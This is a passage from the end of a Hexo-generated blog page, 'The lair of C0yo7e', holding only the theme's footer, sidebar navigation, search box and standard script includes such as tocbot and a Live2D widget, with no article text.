  gitalk.render('gitalk-container')
  </script>

  

</article>



</section>
  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2020 The lair of C0yo7e</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>

<aside class="sidebar sidebar-specter">
  
    <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/time.png" alt="The lair of C0yo7e"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="搜索">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
  </aside>
  <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/lazyload.min.js"></script>
<script src="/js/busuanzi-2.3.pure.min.js"></script>

  <script src="/fancybox/jquery.fancybox.min.js"></script>



  <script src="/js/tocbot.min.js"></script>
  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>


<script src="/js/ocean.js"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>